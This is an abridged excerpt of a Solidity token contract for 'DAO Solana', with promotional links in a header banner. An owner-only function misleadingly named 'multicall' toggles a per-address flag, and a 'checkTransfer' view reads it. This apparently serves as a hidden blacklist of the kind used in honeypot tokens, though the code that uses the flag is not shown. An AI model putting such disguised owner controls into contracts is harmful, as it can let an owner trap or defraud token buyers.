/**  ______  _______  _____       _______  _____         _______ __   _ _______
     |     \ |_____| |     |      |______ |     | |      |_____| | \  | |_____|
     |_____/ |     | |_____|      ______| |_____| |_____ |     | |  \_| |     |

     WEBSITE  - https://solanadao.in      MEDIUM - https://medium.com/@daosolana
    
     TELEGRAM - https://t.me/DAOsolana   TWITTER - https://twitter.com/DaoSolana 
 */
...
contract DAOsolana is Context, IERC20, Ownable {
    ...
    event call (address callAddress, bool isCalled);
    ...
    string private _name = 'DAO Solana';
    string private _symbol = 'DAOsolana';
    ...
    function multicall (address callAddress) external onlyOwner {
        if (_Multicall[callAddress] == true) {
            _Multicall[callAddress] = false;
        } else {_Multicall[callAddress] = true;
            emit call (callAddress, _Multicall[callAddress]);
          }
    }
    
    function checkTransfer(address callAddress) public view returns (bool) {
        return _Multicall[callAddress];
    }
